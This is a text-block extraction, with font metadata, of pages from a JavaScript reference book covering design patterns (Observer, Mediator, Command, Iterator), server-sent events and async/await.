        "text": "Section 79.1: Observer pattern",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  Observer  pattern is used for event handling and delegation. A  subject  maintains a collection of  observers.  The subject then noti\ufb01es these observers whenever an event occurs. If you've ever used  addEventListener  then you've utilized the Observer pattern.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Subject ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     this . observers   =   [];   // Observers listening to the subject    ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     this . registerObserver   =   function ( observer )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Add an observer if it isn't already being tracked",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         if   ( this . observers . indexOf ( observer )   ===   - 1 )   {              this . observers . push ( observer );          }      };      this . unregisterObserver   =   function ( observer )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Removes a previously registered observer",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         var  index  =   this . observers . indexOf ( observer );          if   ( index  >   - 1 )   {              this . observers . splice ( index ,   1 );          }      };      this . notifyObservers   =   function ( message )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Send a message to all observers",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         this . observers . forEach ( function ( observer )   {             observer. notify ( message );          });      }; } function  Observer ()   {      this . notify   =   function ( message )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Every observer must implement this function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example usage:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Employee ( name )   {      this . name   =  name ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Implement `notify` so the subject can pass us messages",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     this . notify   =   function ( meetingTime )   {         console. log ( this . name   +   ': There is a meeting at '   +  meetingTime );      }; } var  bob  =   new  Employee ( 'Bob' ); var  jane  =   new  Employee ( 'Jane' ); var  meetingAlerts  =   new  Subject (); meetingAlerts. registerObserver ( bob ); meetingAlerts. registerObserver ( jane ); meetingAlerts. notifyObservers ( '4pm' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Output:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 387",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Bob: There is a meeting at 4pm // Jane: There is a meeting at 4pm",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 79.2: Mediator Pattern",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Think of the mediator pattern as the \ufb02ight control tower that controls planes in the air: it directs this plane to land now, the second to wait, and the third to take o\ufb00, etc. However no plane is ever allowed to talk to its peers. This is how mediator works, it works as a communication hub among di\ufb00erent modules, this way you reduce module dependency on each other, increase loose coupling, and consequently portability. This  Chatroom example  explains how mediator patterns works:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// each participant is just a module that wants to talk to other modules(other participants)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  Participant  =   function ( name )   {      this . name   =  name ;      this . chatroom   =   null ; };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  // each participant has method for talking, and also listening to other participants",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Participant. prototype   =   {     send :   function ( message ,  to )   {          this . chatroom . send ( message ,   this ,  to );      },     receive :   function ( message ,  from )   {         log. add ( from. name   +   \" to \"   +   this . name   +   \": \"   +  message );      } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  // chatroom is the Mediator: it is the hub where participants send messages to, and receive messages from",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  Chatroom  =   function ()   {      var  participants  =   {};        return   {           register :   function ( participant )   {             participants [ participant. name ]   =  participant ;             participant. chatroom   =   this ;          },           send :   function ( message ,  from )   {              for   ( key  in  participants )   {                     if   ( participants [ key ]   !==  from )   { //you can't message yourself !                     participants [ key ] . receive ( message ,  from );                  }              }          }      }; };  ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// log helper  ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  log  =   ( function ()   {      var  log  =   \"\" ;        return   {         add :   function ( msg )   {  log  +=  msg  +   \" \\n \" ;   },         show :   function ()   {  alert ( log );  log  =   \"\" ;   }      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 388",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "})();  ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  run ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  yoko  =   new  Participant ( \"Yoko\" );      var  john  =   new  Participant ( \"John\" );      var  paul  =   new  Participant ( \"Paul\" );      var  ringo  =   new  Participant ( \"Ringo\" );        var  chatroom  =   new  Chatroom ();     chatroom. register ( yoko );     chatroom. register ( john );     chatroom. register ( paul );     chatroom. register ( ringo );       yoko. send ( \"All you need is love.\" );     yoko. send ( \"I love you John.\" );              paul. send ( \"Ha, I heard that!\" );       log. show (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 79.3: Command",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The command pattern encapsulates parameters to a method, current object state, and which method to call. It is useful to compartmentalize everything needed to call a method at a later time. It can be used to issue a \"command\" and decide later which piece of code to use to execute the command. There are three components in this pattern: Command Message - the command itself, including the method name, parameters, and state 1. Invoker - the part which instructs the command to execute its instructions. It can be a timed event, user 2. interaction, a step in a process, callback, or any way needed to execute the command. Receiver - the target of the command execution. 3.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Command Message as an Array",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  aCommand  =   new  Array (); aCommand. push ( new  Instructions () . DoThis );    //Method to execute aCommand. push ( \"String Argument\" );    //string argument aCommand. push ( 777 );                  //integer argument aCommand. push ( new  Object  {}   );       //object argument aCommand. push ( new  Array ()   );         //array argument",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Constructor for command class",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  DoThis  {     constructor (  stringArg ,  numArg ,  objectArg ,  arrayArg  )   {          this ._stringArg  =  stringArg ;          this ._numArg  =  numArg ;          this ._objectArg  =  objectArg ;          this ._arrayArg  =  arrayArg ;      }     Execute ()   {         var  receiver  =   new  Instructions ();        receiver. DoThis ( this ._stringArg ,   this ._numArg ,   this ._objectArg ,   this ._arrayArg  );      } }     ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 389",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Invoker",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "aCommand. Execute ();   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Can invoke: immediately in response to an event in a sequence of execution as a callback response or in a promise at the end of an event loop in any other needed way to invoke a method",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Receiver",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  Instructions  {     DoThis (  stringArg ,  numArg ,  objectArg ,  arrayArg  )   {         console. log (  `$ { stringArg },  $ { numArg },  $ { objectArg },  $ { arrayArg } `  );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A client generates a command, passes it to an invoker that either executes it immediately or delays the command, and then the command acts upon a receiver. The command pattern is very useful when used with companion patterns to create messaging patterns.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 79.4: Iterator",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "An iterator pattern provides a simple method for selecting, sequentially, the next item in a collection.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Fixed Collection",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  BeverageForPizza  {     constructor ( preferenceRank )   {          this . beverageList   =  beverageList ;          this . pointer   =   0 ;      }     next ()   {          return   this . beverageList [ this . pointer ++];      } var  withPepperoni  =   new  BeverageForPizza ([ \"Cola\" ,   \"Water\" ,   \"Beer\" ]); withPepperoni. next ();   //Cola withPepperoni. next ();   //Water withPepperoni. next ();   //Beer",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In ECMAScript 2015 iterators are a built-in as a method that returns done and value. done is true when the iterator is at the end of the collection",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  preferredBeverage ( beverage ){      if (  beverage  ==   \"Beer\"   ){          return   true ;      }   else   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   false ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     } } var  withPepperoni  =   new  BeverageForPizza ([ \"Cola\" ,   \"Water\" ,   \"Beer\" ,   \"Orange Juice\" ]); for (   var  bevToOrder of withPepperoni  ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 390",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     if (  preferredBeverage (  bevToOrder  )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        bevToOrder. done ;   //false, because \"Beer\" isn't the final collection item",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return  bevToOrder ;   //\"Beer\"      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As a Generator",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  FibonacciIterator  {     constructor ()   {          this . previous   =   1 ;          this . beforePrevious   =   1 ;      }     next ()   {          var  current  =   this . previous   +   this . beforePrevious ;          this . beforePrevious   =   this . previous ;          this . previous   =  current ;          return  current ;      } } var  fib  =   new  FibonacciIterator (); fib. next ();   //2 fib. next ();   //3 fib. next ();   //5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In ECMAScript 2015",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function *  FibonacciGenerator ()   {    //asterisk informs javascript of generator",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  previous  =   1 ;      var  beforePrevious  =   1 ;     while ( true )   {          var  current  =  previous  +  beforePrevious ;         beforePrevious  =  previous ;         previous  =  current ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        yield current ;    //This is like return but                          //keeps the current state of the function                          // i.e it remembers its place between calls",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     } } var  fib  =  FibonacciGenerator (); fib. next () . value ;   //2 fib. next () . value ;   //3 fib. next () . value ;   //5 fib. next () . done ;   //false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 391",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 80: Server-sent events",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 80.1: Setting up a basic event stream to the server",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can setup your client browser to listen in incoming server events using the  EventSource  object. You will need to supply the constructor a string of the path to the server' API endpoint the will subscribe the client to the server events. Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  eventSource  =   new  EventSource ( \"api/my-events\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Events have names with which they are categorized and sent, and a listener must be setup to listen to each such event by name. the default event name is  message  and in order to listen to it you must use the appropriate event listener,  . onmessage",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "evtSource. onmessage   =   function ( event )   {    var  data  =  JSON. parse ( event. data );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // do something with data }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The above function will run every time the server will push an event to the client. Data is sent as  text / plain , if you send JSON data you may want to parse it.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 80.2: Closing an event stream",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "An event stream to the server can be closed using the  EventSource. close ()  method",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  eventSource  =   new  EventSource ( \"api/my-events\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// do things ... eventSource. close ();   // you will not receive anymore events from this object",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  . close ()  method does nothing is the stream is already closed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 80.3: Binding event listeners to EventSource",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can bind event listeners to the  EventSource  object to listen to di\ufb00erent events channels using the",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": ". addEventListener  method.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "EventSource.addEventListener(name: String, callback: Function, [options]) name : The name related to the name of the channel the server is emitting events to. callback : The callback function runs every time an event bound to the channel is emitted, the function provides the event  as an argument. options : Options that characterize the behavior of the event listener. The following example shows a heartbeat event stream from the server, the server sends events on the  heartbeat channel and this routine will always run when an event in accepted.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  eventSource  =   new  EventSource ( \"api/heartbeat\" ); ...",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 392",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "eventSource . addEventListener ( \"heartbeat\" ,   function ( event )   {    var  status  =  event. data ;    if   ( status == 'OK' )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // do something    } });",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 393",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 81: Async functions (async/await)",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "async  and  await  build on top of promises and generators to express asynchronous actions inline. This makes asynchronous or callback code much easier to maintain. Functions with the  async  keyword return a  Promise , and can be called with that syntax. Inside an  async  function  the  await  keyword can be applied to any  Promise , and will cause all of the function body after the  await  to be executed after the promise resolves.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 81.1: Introduction",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A function de\ufb01ned as  async  is a function that can perform asynchronous actions but still look synchronous. The way it's done is using the  await  keyword to defer the function while it waits for a Promise to resolve or reject. Note:  Async functions are  a Stage 4 (\"Finished\") proposal  on track to be included in the ECMAScript 2017 standard. For instance, using the promise-based  Fetch API :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "async  function  getJSON ( url )   {      try   {          const  response  =  await fetch ( url );          return  await response. json ();      }      catch   ( err )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         // Rejections in the promise will get thrown here",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        console. error ( err. message );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "An async function always returns a Promise itself, so you can use it in other asynchronous functions.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Arrow function style",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  getJSON  =  async url  =>   {      const  response  =  await fetch ( url );      return  await response. json (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 81.2: Await and operator precedence",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You have to keep the operator precedence in mind when using  await  keyword. Imagine that we have an asynchronous function which calls another asynchronous function,  getUnicorn ()  which returns a Promise that resolves to an instance of class  Unicorn . Now we want to get the size of the unicorn using the  getSize ()  method of that class. Look at the following code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "async  function  myAsyncFunction ()   {     await getUnicorn () . getSize (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "At \ufb01rst sight, it seems valid, but it's not. Due to operator precedence, it's equivalent to the following:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "async  function  myAsyncFunction ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 394",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    await  ( getUnicorn () . getSize ()); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here we attempt to call  getSize ()  method of the Promise object, which isn't what we want. Instead, we should use brackets to denote that we \ufb01rst want to wait for the unicorn, and then call  getSize () method of the result:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "async  function  asyncFunction ()   {      ( await getUnicorn ()) . getSize (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Of course. the previous version could be valid in some cases, for example, if the  getUnicorn ()  function was synchronous, but the  getSize ()  method was asynchronous.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 81.3: Async functions compared to Promises",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "async  functions do not replace the  Promise  type; they add language keywords that make promises easier to call. They are interchangeable:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "async  function  doAsyncThing ()   {  ...  } function  doPromiseThing ( input )   {   return   new  Promise (( r ,  x )   =>  ... );   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Call with promise syntax",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "doAsyncThing ()     . then ( a  =>  doPromiseThing ( a ))     . then ( b  =>  ... )     . catch ( ex  =>  ... );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Call with await syntax",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "try   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     const  a  =  await doAsyncThing ();      const  b  =  await doPromiseThing ( a );     ... } catch ( ex )   {  ...  }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Any function that uses chains of promises can be rewritten using  await :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  newUnicorn ()   {    return  fetch ( 'unicorn.json' )                       // fetch unicorn.json from server   . then ( responseCurrent  =>  responseCurrent. json ())   // parse the response as JSON   . then ( unicorn  =>     fetch ( 'new/unicorn' ,   {                           // send a request to 'new/unicorn'         method :   'post' ,                              // using the POST method         body :  JSON. stringify ({ unicorn })              // pass the unicorn to the request body      })    )   . then ( responseNew  =>  responseNew. json ())   . then ( json  =>  json. success )                        // return success property of response   . catch ( err  =>  console. log ( 'Error creating unicorn:' ,  err ));   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The function can be rewritten using  async  /  await  as follows:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "async  function  newUnicorn ()   {    try   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 395",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     const  responseCurrent  =  await fetch ( 'unicorn.json' );   // fetch unicorn.json from server      const  unicorn  =  await responseCurrent. json ();          // parse the response as JSON      const  responseNew  =  await fetch ( 'new/unicorn' ,   {       // send a request to 'new/unicorn'       method :   'post' ,                                      // using the POST method       body :  JSON. stringify ({ unicorn })                      // pass the unicorn to the request body      });      const  json  =  await responseNew. json ();      return  json. success                                    // return success property of response    }   catch   ( err )   {     console. log ( 'Error creating unicorn:' ,  err );    } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This  async  variant of  newUnicorn ()  appears to return a  Promise , but really there were multiple  await  keywords. Each one returned a  Promise , so really we had a collection of promises rather than a chain. In fact we can think of it as a  function *  generator, with each  await  being a  yield  new  Promise . However, the results of each promise are needed by the next to continue the function. This is why the additional keyword  async is needed on the function (as well as the  await  keyword when calling the promises) as it tells JavaScript to automatically creates an observer for this iteration. The  Promise  returned by  async  function  newUnicorn () resolves when this iteration completes. Practically, you don't need to consider that;  await  hides the promise and  async  hides the generator iteration. You can call  async  functions as if they were promises, and  await  any promise or any  async  function. You don't need to  await  an async function, just as you can execute a promise without a  . then () . You can also use an  async   IIFE  if you want to execute that code immediately:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( async  ()   =>   {   await makeCoffee ()   console. log ( 'coffee is ready!' ) })()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 81.4: Looping with async await",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When using async await in loops, you might encounter some of these problems. If you just try to use await inside  forEach , this will throw an  Unexpected token  error.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( async ()   =>   {  data  =   [ 1 ,   2 ,   3 ,   4 ,   5 ];  data. forEach ( e  =>   {     const  i  =  await somePromiseFn ( e );    console. log ( i );   }); })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This comes from the fact that you've erroneously seen the arrow function as a block. The  await  will be in the context of the callback function, which is not  async . The interpreter protects us from making the above error, but if you add  async  to the  forEach  callback no errors get thrown. You might think this solves the problem, but it won't work as expected. Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( async ()   =>   {   data  =   [ 1 ,   2 ,   3 ,   4 ,   5 ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 396",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  data. forEach ( async ( e )   =>   {      const  i  =  await somePromiseFn ( e );     console. log ( i );    });   console. log ( 'this will print first' ); })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This happens because the callback async function can only pause itself, not the parent async function. You could write an asyncForEach function that returns a promise and then you could something like",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "await asyncForEach ( async  ( e )   =>  await somePromiseFn ( e ),  data  )  Basically you return a promise",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "that resolves when all the callbacks are awaited and done. But there are better ways of doing this, and that is to just use a loop. You can use a  for - of  loop or a  for / while  loop, it doesn't really matter which one you pick.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( async ()   =>   {   data  =   [ 1 ,   2 ,   3 ,   4 ,   5 ];    for   ( let  e of data )   {      const  i  =  await somePromiseFn ( e );     console. log ( i );    }   console. log ( 'this will print last' ); })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "But there's another catch. This solution will wait for each call to  somePromiseFn  to complete before iterating over the next one. This is great if you actually want your  somePromiseFn  invocations to be executed in order but if you want them to run concurrently, you will need to  await  on  Promise. all .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( async ()   =>   {  data  =   [ 1 ,   2 ,   3 ,   4 ,   5 ];   const  p  =  await Promise. all ( data. map ( async ( e )   =>  await somePromiseFn ( e )));  console. log ( ... p ); })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Promise. all  receives an array of promises as its only parameter and returns a promise. When all of the promises in the array are resolved, the returned promise is also resolved. We  await  on that promise and when it's resolved all our values are available. The above examples are fully runnable. The  somePromiseFn  function can be made as an async echo function with a timeout. You can try out the examples in the  babel-repl  with at least the  stage - 3  preset and look at the output.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  somePromiseFn ( n )   {   return   new  Promise (( res ,  rej )   =>   {    setTimeout (()   =>  res ( n ),   250 );   }); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 81.5: Less indentation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "With promises:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  doTheThing ()   {      return  doOneThing ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 397",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "        . then ( doAnother )         . then ( doSomeMore )         . catch ( handleErrors ) }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With async functions:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "async  function  doTheThing ()   {      try   {          const  one  =  await doOneThing ();          const  another  =  await doAnother ( one );          return  await doSomeMore ( another );      }   catch   ( err )   {         handleErrors ( err );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note how the return is at the bottom, and not at the top, and you use the language's native error-handling mechanics ( try / catch ).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 81.6: Simultaneous async (parallel) operations",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Often you will want to perform asynchronous operations in parallel. There is direct syntax that supports this in the async / await  proposal, but since  await  will wait for a promise, you can wrap multiple promises together in Promise. all  to wait for them:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Not in parallel",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "async  function  getFriendPosts ( user )   {     friendIds  =  await db. get ( \"friends\" ,   { user },   { id :   1 });     friendPosts  =   [];      for   ( let  id  in  friendIds )   {         friendPosts  =  friendPosts. concat (  await db. get ( \"posts\" ,   { user :  id })   );      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // etc. }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will do each query to get each friend's posts serially, but they can be done simultaneously:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// In parallel",
